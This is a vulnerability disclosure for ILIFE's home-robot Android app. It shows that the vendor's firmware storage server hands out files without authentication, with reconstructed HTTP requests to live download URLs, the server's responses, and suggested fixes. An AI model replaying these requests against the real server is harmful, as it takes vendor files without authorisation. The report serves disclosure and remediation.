# Vulnerability Report - com.ilife.home.global- Incorrect Access Control

**Product:** `com.ilife.home.global`

**Vendor:** [ILIFE](https://www.iliferobot.com/)

**Version:** 1.8.7

**Vulnerability Type:** Incorrect Access Control

**Severity:** High

## Description

The `com.ilife.home.global` , developed by **ILIFE**, suffers from an Incorrect Access Control vulnerability during the device firmware update process. The app uses HTTPS requests to download firmware updates. By reverse engineering the app, it was possible to identify the firmware download mechanism and the download link. Dynamic testing revealed that the vendor's firmware server lacks proper access control, leading to **firmware leakage**.

## Reproduction Steps

1. The `return` values in the `m5935q, m5934r, m5933s`methods provide the necessary URL and other information required for the HTTPS request. Static reverse engineering allows for the reconstruction of the complete request as follows:

   ![image-20241003194922411](https://s2.loli.net/2024/10/03/YXW1gtnv5cPlbVD.png)

2. Sending this URL request to the firmware server results in a direct response containing the latest firmware information as follows:

   > Request

   ```http
   GET https://voicepacket.oss-cn-shenzhen.aliyuncs.com/voicepacket/eu/1059/1681466137593_200S_en_EN.zip HTTP/1.0
   User-Agent: Fiddler
   Host: voicepacket.oss-cn-shenzhen.aliyuncs.com
   ```

   ```http
   GET https://voicepacket.oss-cn-shenzhen.aliyuncs.com/voicepacket/eu/1059/1672905358863_200S_ja_JA.zip HTTP/1.0
   User-Agent: Fiddler
   Host: voicepacket.oss-cn-shenzhen.aliyuncs.com
   ```

   > Response:

   ```http
   HTTP/1.1 200 OK
   Server: AliyunOSS
   Date: Thu, 03 Oct 2024 11:51:39 GMT
   Content-Type: application/zip
   Content-Length: 1608967
   Connection: close
   x-oss-request-id: 66FE854B57E6163538D763FC
   Accept-Ranges: bytes
   ETag: "FF0DB8DFF50D2685AEFBD7A8E1FF2DF3"
   Last-Modified: Fri, 14 Apr 2023 09:55:37 GMT
   x-oss-object-type: Normal
   x-oss-hash-crc64ecma: 11523379598591970559
   x-oss-storage-class: Standard
   Content-MD5: /w243/UNJoWu+9eo4f8t8w==
   x-oss-server-time: 42
   
   PK        V               
   ......
   ```

   ```http
   HTTP/1.1 200 OK
   Server: AliyunOSS
   Date: Thu, 03 Oct 2024 11:52:33 GMT
   Content-Type: application/x-zip-compressed
   Content-Length: 2455559
   Connection: close
   x-oss-request-id: 66FE85813C8E2938387240CB
   Accept-Ranges: bytes
   ETag: "24938158F0C1293365AF32171ABC6EA4"
   Last-Modified: Thu, 05 Jan 2023 07:56:13 GMT
   x-oss-object-type: Normal
   x-oss-hash-crc64ecma: 2568797236492734421
   x-oss-storage-class: Standard
   Content-MD5: JJOBWPDBKTNlrzIXGrxupA==
   x-oss-server-time: 58
   
   PK      wUqQO I   @       2_9.mp3   [ i 8  YDDECECsDS 
   ......
   ```

3. Consequently, the unprotected firmware can be directly downloaded using this information.

   ![image-20241003195322615](https://s2.loli.net/2024/10/03/ANSP2UKxg5DhrtB.png)

   In total, we successfully downloaded **13 firmware** by exploiting the vulnerability.

## Impact

An attacker can exploit this vulnerability to:

- Download the latest firmware before it is officially released.
- Analyze the firmware for vulnerabilities or proprietary information.
- Create modified firmware images with malicious code.
- Distribute compromised firmware updates to unsuspecting users.

## Remediation

- Implement proper access control on the firmware server, such as device ID and user ID verification.
- Enhance the app's firmware update mechanism to include authentication credentials in the requests.

## Disclaimer

This vulnerability report is provided for informational purposes only and should not be used for any malicious activities. The author is not responsible for any misuse of the information contained herein.